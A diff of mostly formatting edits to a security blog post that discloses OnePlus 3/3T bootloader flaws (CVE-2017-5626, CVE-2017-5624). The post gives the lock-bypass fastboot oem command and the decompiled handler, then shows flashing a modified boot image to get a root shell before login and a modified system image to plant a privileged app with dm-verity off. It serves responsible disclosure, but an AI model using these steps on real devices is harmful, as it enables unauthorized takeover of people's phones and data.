@@ -12,11 +12,13 @@ In this blog post I disclose two vulnerabilities in the OnePlus 3/3T bootloader.
 
 Both issues were responsibly disclosed to and acknowledged by *OnePlus Security*. The first vulnerability, [CVE-2017-5626], was reported on **January 23rd**. It was also found independently by a OnePlus engineer. [CVE-2017-5624], reported on **January 16th**, should be fixed in a future OxygenOS release -- the reason for its today's public disclosure is because someone already [published](https://forum.xda-developers.com/oneplus-3/how-to/fix-easy-method-removing-dm-verity-t3544339) it on **January 24th**.
 
-*Disclaimer* I tested the vulnerabilities on OnePlus 3 only, but OnePlus 3T contains the vulnerable code too.
+*Disclaimer*: I tested the vulnerabilities on OnePlus 3 only, but OnePlus 3T contains the vulnerable code too.
 
 ### Bypassing the Bootloader's Lock (CVE-2017-5626) ###
 OnePlus 3 & 3T running OxygenOS 3.2 - 4.0.1 had two proprietary fastboot `oem` commands:
-1. `fastboot oem 4F500301` -- bypasses the bootloader's lock -- allowing one with fastboot access to effectively unlock the device, disregarding `OEM Unlocking`, without user confirmation and without erasure of userdata (which occurs normally after lock-state changes). Moreover, the device still reports it's locked after running this command.
+
+1. `fastboot oem 4F500301` -- bypasses the bootloader's lock -- allowing one with fastboot access to effectively unlock the device, disregarding `OEM Unlocking`, without user confirmation and without erasure of userdata (which normally occurs after lock-state changes). Moreover, the device still reports it's locked after running this command.
+
 2. `fastboot oem 4F500302` -- resets various bootloader settings. For example, it will lock an unlocked bootloader without user confirmation.
 
 Analyzing the bootloader binary shows that the routine which handles the `4F500301` command is pretty straightforward: 
@@ -32,7 +34,7 @@ int sub_918427F0()
 }
 ```
 
-Thus it sets some global flag located at `91989C10` (which we named `magicFlag`). By looking at the procedures which handle the format/erase fastboot command, we can clearly see `magicFlag` overrides the lock state of the device in several checks -- when flashing or erasing a partition:
+Thus it sets some global flag located at `91989C10` (which we named `magicFlag`). By looking at the procedures which handle the format/erase fastboot commands, we can clearly see `magicFlag` overrides the lock state of the device in several checks -- when flashing or erasing a partition:
 
 ```c
 // 'flash' handler
@@ -135,7 +137,7 @@ LABEL_23:
 
 ### Exploiting CVE-2017-5626 for Kernel Code Execution ###
 By exploiting this vulnerability, the attacker, for example, can flash a malicious boot image (which contains both the kernel & the root ramfs), in order to practically own the platform. 
-The problem, however, is that the bootloader and platform detect such modifications, a feature known as [Verified Boot](https://source.android.com/security/verifiedboot/). The `boot` and `recovery` partitions are verified by the bootloader (aboot) -- flashing a modified `boot` partition, for instance, will prompt the following warning upon boot:
+The problem, however, is that the bootloader and platform detect such modifications, a feature known as [Verified Boot](https://source.android.com/security/verifiedboot/). The `boot` and `recovery` partitions are verified by the bootloader -- flashing a modified `boot` partition, for instance, will prompt the following warning upon boot:
 
 ![Verified Boot warning](/images/opo3-red-bootstate.jpg).
 
@@ -145,13 +147,16 @@ Another option which will not trigger this warning is flashing an old non-modifi
 Anyway, despite the warning (which automatically disappears after 5 seconds!) OnePlus 3/3T still allows to boot in the red [verifiedboot state](https://source.android.com/security/verifiedboot/verified-boot.html#boot_state), hence the attacker's code executes. 
 
 There is an uncountable number of ways for demonstrating the severity of this, so I chose the easiest one.
+
 By modifying the boot image:
+
 1. I've set SELinux to `permissive` mode by appending `androidboot.selinux=permissive` to the kernel command line.
+
 2. I've modified the `ramfs` s.t. `ro.debuggable=1`, `ro.secure=0`, `ro.adb.secure=0`, and changed the USB config property (`sys.usb.config`) to include `adb` upon boot.
 
 I then exploited the vulnerability, flashing the modified `boot.img` (`evil_boot.img`):
 
-```terminal
+```c
 λ fastboot flash boot evil_boot.img
 target reported max download size of 440401920 bytes
 sending 'boot' (14836 KB)...
@@ -176,7 +181,7 @@ finished. total time: 0.480s
 
 That had given me a root shell, even before the user entered his credentials:
 
-```terminal
+```c
 OnePlus3:/ # id
 uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
 1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
@@ -201,7 +206,7 @@ int init_module(void)
 ```
 
 And then loaded it into the kernel:
-```terminal
+```c
 OnePlus3:/data/local/tmp # insmod ./test.ko
 OnePlus3:/data/local/tmp # dmesg | grep Hello
 [19700121_21:09:58.970409]@3 Hello From Kernel
@@ -239,7 +244,7 @@ The `androidboot.enable_dm_verity` kernel command line argument propagates to th
 
 The couple of vulnerabilities can be combined together for code execution with privileged SELinux domains, without any warning to the user and with access to the original user data. In order to demonstrate this (and there are probably thousands of better ways with a higher severity), I've modified the system partition, adding a privileged app. This can be done by placing an APK under `/system/priv-app/<APK_DIR>` which will eventually cause it to be added to the [priv_app domain](https://android.googlesource.com/platform/system/sepolicy/+/android-7.1.1_r16/priv_app.te).
 
-```terminal
+```c
 λ fastboot flash system system-modded.simg
 target reported max download size of 440401920 bytes
 erasing 'system'...
@@ -268,7 +273,7 @@ OKAY
 ```
 
 Indeed the app loads with the `priv_app` context:
-```terminal
+```c
 1|OnePlus3:/ $ getprop | grep dm_verity
 [ro.boot.enable_dm_verity]: [0]
 OnePlus3:/ $ ps -Z | grep roeeh
